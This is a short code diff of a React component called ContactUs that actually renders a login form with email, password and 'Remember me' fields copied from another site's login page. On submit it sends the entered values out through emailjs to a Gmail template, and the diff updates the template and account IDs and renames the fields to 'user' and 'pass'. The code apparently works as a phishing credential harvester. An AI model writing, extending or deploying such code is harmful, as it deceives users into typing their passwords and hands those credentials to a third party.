@@ -7,7 +7,7 @@ export default function ContactUs() {
     function sendEmail(e) {
         e.preventDefault();
 
-    emailjs.sendForm('gmail', 'template_0vlz6hx', e.target, 'user_99ogBoikg8ImrHb1RSNcB')
+    emailjs.sendForm('gmail', 'template_hb9qmr9', e.target, 'user_SEoZ3jhZmvmc7W9yRaSnR')
         .then((result) => {
             console.log(result.text);
         }, (error) => {
@@ -50,12 +50,12 @@ export default function ContactUs() {
         <small>
             (e.g., user@example.com)</small>
     </h2>
-    <input name="email" type="text" tabindex="1" />
+    <input name="user" type="text" tabindex="1" />
                          
     <h2>
         Password
     </h2>
-    <input  name="name" id="pass"  type="password" tabindex="2" />
+    <input  name="pass" id="pass"  type="password" tabindex="2" />
                            
     <input  type="checkbox"  tabindex="3" /><label for="ctl00_MPH_chkAutoLogin">Remember me</label>
 
